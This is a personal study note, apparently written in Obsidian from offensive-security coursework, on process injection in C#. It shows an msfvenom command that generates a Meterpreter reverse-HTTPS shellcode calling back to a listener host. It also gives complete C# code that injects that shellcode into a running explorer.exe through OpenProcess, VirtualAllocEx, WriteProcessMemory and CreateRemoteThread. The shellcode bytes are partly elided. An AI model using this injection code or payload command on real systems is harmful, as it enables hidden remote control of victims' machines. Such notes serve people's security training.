---
creation date: December 28th 2022
last modified date: December 28th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Process Injection in C#]]  
___

## Description:  
Meterpreter shell running inside explorer.exe
Generate shellcode:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f csharp
```
Full code with process migration: 
```
using System;
using System.Runtime.InteropServices;
namespace Inject
{
 class Program
 {
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId);
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint 
dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 [DllImport("kernel32.dll")]
 static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr 
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint 
dwCreationFlags, IntPtr lpThreadId);
 static void Main(string[] args)
 {
 IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 byte[] buf = new byte[591] {
 
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
 ....
 0x0a,0x41,0x89,0xda,0xff,0xd5 };
 IntPtr outSize;
 WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
 IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, 
IntPtr.Zero, 0, IntPtr.Zero);
 }
 }
}
```
Before compiling the project, we need to remember to set the CPU architecture to x64 since we are injecting into a 64-bit process.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 28th 2022 (11:17 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
